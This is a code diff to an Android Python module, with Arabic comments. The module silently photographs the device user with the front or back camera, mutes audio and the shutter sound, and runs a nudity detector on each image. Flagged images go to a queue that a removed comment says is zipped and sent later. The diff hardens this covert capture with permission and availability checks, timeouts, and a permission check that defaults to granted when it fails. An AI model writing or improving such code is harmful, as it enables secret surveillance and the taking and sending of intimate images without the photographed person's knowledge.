@@ -40,11 +40,47 @@ class CameraAnalyzer:
         self.det = det                # NudeDetector instance (يحتوي على النموذج)
         self.busy = False
         self._old_volume = -1
+        self._timers = []             # للاحتفاظ بالمؤقتات النشطة
+
+    # ========== التحقق من صلاحيات الكاميرا ==========
+    def _check_camera_permission(self):
+        """التحقق من منح صلاحية الكاميرا"""
+        if not JNI:
+            return True
+        try:
+            from android.permissions import check_permission, Permission
+            return check_permission(Permission.CAMERA)
+        except Exception as e:
+            logging.error(f"Permission check error: {e}")
+            return True  # افتراضي True في حالة فشل التحقق
+
+    # ========== التحقق من توفر الكاميرا ==========
+    def _is_camera_available(self, cam_id):
+        """التحقق من وجود الكاميرا المطلوبة"""
+        if not JNI:
+            return False
+        try:
+            Camera = autoclass('android.hardware.Camera')
+            CameraInfo = autoclass('android.hardware.Camera$CameraInfo')
+            num_cameras = Camera.getNumberOfCameras()
+            
+            if num_cameras <= cam_id:
+                return False
+                
+            desired_facing = CameraInfo.CAMERA_FACING_BACK if cam_id == 0 else CameraInfo.CAMERA_FACING_FRONT
+            for i in range(num_cameras):
+                info = CameraInfo()
+                Camera.getCameraInfo(i, info)
+                if info.facing == desired_facing:
+                    return True
+            return False
+        except Exception as e:
+            logging.error(f"Camera availability check error: {e}")
+            return False
 
     # ========== التحقق من البطارية ==========
     def _power_ok(self):
         try:
-            # تصحيح اسم الدالة: _battery_ok بدلاً من _bat
             b, c = self.mon._battery_ok() if hasattr(self.mon, '_battery_ok') else (100, True)
             return b >= 15 or c
         except:
@@ -68,9 +104,38 @@ class CameraAnalyzer:
         except Exception as e:
             logging.error(f"Mute error: {e}")
 
+    # ========== تنظيف الملفات القديمة ==========
+    def _cleanup_old_files(self):
+        """حذف الملفات القديمة من المجلدات المؤقتة"""
+        try:
+            now = time.time()
+            for folder in [T, QUEUE]:
+                if os.path.exists(folder):
+                    for f in os.listdir(folder):
+                        path = os.path.join(folder, f)
+                        try:
+                            if os.path.getmtime(path) < now - 3600:  # حذف الملفات الأقدم من ساعة
+                                os.remove(path)
+                        except:
+                            pass
+        except Exception as e:
+            logging.error(f"Cleanup error: {e}")
+
     # ========== ضغط الصورة (لتوفير المساحة والطاقة) ==========
     def _compress_image(self, path, quality=80):
-        """يحاول ضغط ملف الصورة إلى جودة أقل باستخدام OpenCV (إذا كان متوفراً)"""
+        """يحاول ضغط ملف الصورة إلى جودة أقل باستخدام PIL كبديل أول"""
+        try:
+            from PIL import Image
+            with Image.open(path) as img:
+                img = img.convert('RGB')
+                img.save(path, "JPEG", quality=quality, optimize=True)
+                return True
+        except ImportError:
+            pass
+        except Exception as e:
+            logging.error(f"PIL compression error: {e}")
+
+        # محاولة ثانية باستخدام OpenCV إذا كان متوفراً
         try:
             import cv2
             img = cv2.imread(path)
@@ -81,10 +146,9 @@ class CameraAnalyzer:
                     f.write(buffer)
                 return True
         except ImportError:
-            # OpenCV غير مثبت – تجاهل بهدوء
             pass
         except Exception as e:
-            logging.error(f"Compression error: {e}")
+            logging.error(f"OpenCV compression error: {e}")
         return False
 
     # ========== التقاط صورة (صامتة) مع تحديد الكاميرا بدقة ==========
@@ -94,12 +158,22 @@ class CameraAnalyzer:
         cam_id = 0 خلفية, 1 أمامية.
         تعيد مسار الصورة المحفوظة أو None.
         """
+        # التحقق من الصلاحيات والتوفر
+        if not self._check_camera_permission():
+            logging.error("Camera permission not granted")
+            return None
+            
+        if not self._is_camera_available(cam_id):
+            logging.error(f"Camera {cam_id} not available")
+            return None
+
         if self.busy or not self._power_ok():
             return None
 
         self.busy = True
         out_path = None
         camera = None
+        callback_ref = None
 
         if JNI:
             self._mute_audio(True)
@@ -117,11 +191,20 @@ class CameraAnalyzer:
                     if info.facing == desired_facing:
                         target_id = i
                         break
+                
                 if target_id == -1:
                     logging.error("No suitable camera found for facing: %d", desired_facing)
+                    self.busy = False
+                    self._mute_audio(False)
                     return None
 
                 camera = Camera.open(target_id)
+                if camera is None:
+                    logging.error("Failed to open camera")
+                    self.busy = False
+                    self._mute_audio(False)
+                    return None
+
                 params = camera.getParameters()
 
                 # اختيار دقة مناسبة (قريبة من 1024x768)
@@ -130,10 +213,17 @@ class CameraAnalyzer:
                     target_area = 1024 * 768
                     best_size = min(supported_sizes, key=lambda s: abs(s.width * s.height - target_area))
                     params.setPictureSize(best_size.width, best_size.height)
+                    logging.info(f"Selected camera size: {best_size.width}x{best_size.height}")
 
                 # إعدادات الصورة والإخراج
                 params.setPictureFormat(autoclass('android.graphics.ImageFormat').JPEG)
-                params.set("shutter-sound", 0)  # إسكات صوت الكاميرا
+                
+                # محاولة إسكات صوت الكاميرا (قد لا تعمل في جميع الأجهزة)
+                try:
+                    params.set("shutter-sound", 0)
+                except:
+                    pass
+                    
                 # التدوير حسب نوع الكاميرا
                 rotation = 270 if cam_id == 1 else 90
                 params.setRotation(rotation)
@@ -141,28 +231,49 @@ class CameraAnalyzer:
 
                 out_path = os.path.join(T, f"c_{cam_id}_{int(time.time())}.jpg")
                 image_saved = threading.Event()
+                image_data = [None]  # لتخزين البيانات
 
                 class PicCallback(PythonJavaClass):
                     __javainterfaces__ = ['android.hardware.Camera$PictureCallback']
+                    
+                    def __init__(self, event, data_store):
+                        super().__init__()
+                        self.event = event
+                        self.data_store = data_store
+                    
                     @java_method('([BLandroid/hardware/Camera;)V')
                     def onPictureTaken(self, data, cam):
-                        with open(out_path, 'wb') as f:
-                            f.write(data)
-                        image_saved.set()
+                        try:
+                            self.data_store[0] = data
+                            with open(out_path, 'wb') as f:
+                                f.write(data)
+                        except Exception as e:
+                            logging.error(f"Callback write error: {e}")
+                        finally:
+                            self.event.set()
 
+                callback_ref = PicCallback(image_saved, image_data)
                 camera.startPreview()
-                camera.takePicture(None, None, PicCallback())
+                time.sleep(0.5)  # تأخير قصير للسماح للمعاينة بالاستقرار
+                
+                camera.takePicture(None, None, callback_ref)
 
-                # مهلة 15 ثانية
-                if not image_saved.wait(15):
-                    logging.warning("Camera capture timeout after 15 seconds")
+                # مهلة 20 ثانية (زيادة عن السابق للأمان)
+                if not image_saved.wait(20):
+                    logging.warning("Camera capture timeout after 20 seconds")
                     out_path = None
 
-                camera.stopPreview()
+                try:
+                    camera.stopPreview()
+                except:
+                    pass
 
-                # ضغط الصورة فور التقاطها (إذا أمكن)
-                if out_path and os.path.exists(out_path):
+                # التحقق من الملف وضغطه
+                if out_path and os.path.exists(out_path) and os.path.getsize(out_path) > 100:
                     self._compress_image(out_path, quality=80)
+                else:
+                    logging.error("Captured file is empty or missing")
+                    out_path = None
 
             except Exception as e:
                 logging.error(f"Capture error: {e}")
@@ -174,6 +285,8 @@ class CameraAnalyzer:
                     except:
                         pass
                 self._mute_audio(False)
+                # تنظيف الملفات القديمة بعد كل عملية التقاط
+                self._cleanup_old_files()
                 gc.collect()
 
         self.busy = False
@@ -185,10 +298,14 @@ class CameraAnalyzer:
         تحويل الصورة إلى مصفوفة (224x224, float32) لتغذية النموذج.
         تستورد numpy و PIL داخلياً لتجنب فشل التحميل إذا كانت المكتبات مفقودة.
         """
+        if not os.path.exists(path):
+            return None
+            
         try:
             from PIL import Image
             import numpy as np
         except ImportError:
+            logging.error("PIL or numpy not available")
             return None
 
         try:
@@ -213,7 +330,7 @@ class CameraAnalyzer:
         is_nude = False
         confidence = 0.0
 
-        # التحقق من وجود كاشف ونموذج محمّل (قد يكون قيد التحميل بعد أول تشغيل)
+        # التحقق من وجود كاشف ونموذج محمّل
         if self.det and hasattr(self.det, 'model') and self.det.model is not None:
             input_data = self._prepare_for_ai(pic_path)
             if input_data is not None:
@@ -247,19 +364,29 @@ class CameraAnalyzer:
                 except Exception as e:
                     logging.error(f"Alert send error: {e}")
 
-            # نقل الصورة إلى مجلد الانتظار (سيتم ضغطها وإرسالها لاحقاً بواسطة daily_zipper)
+            # نقل الصورة إلى مجلد الانتظار
             dest = os.path.join(QUEUE, os.path.basename(pic_path))
             try:
+                # التأكد من عدم وجود ملف بنفس الاسم
+                if os.path.exists(dest):
+                    base, ext = os.path.splitext(dest)
+                    dest = f"{base}_{int(time.time())}{ext}"
                 os.rename(pic_path, dest)
                 logging.info(f"Moved to queue: {dest}")
             except Exception as e:
                 logging.error(f"Move error: {e}")
                 if os.path.exists(pic_path):
-                    os.remove(pic_path)
+                    try:
+                        os.remove(pic_path)
+                    except:
+                        pass
         else:
             # حذف الصورة العادية فوراً
             if os.path.exists(pic_path):
-                os.remove(pic_path)
+                try:
+                    os.remove(pic_path)
+                except Exception as e:
+                    logging.error(f"Delete error: {e}")
 
 
 # ========== دالة المصنع ==========
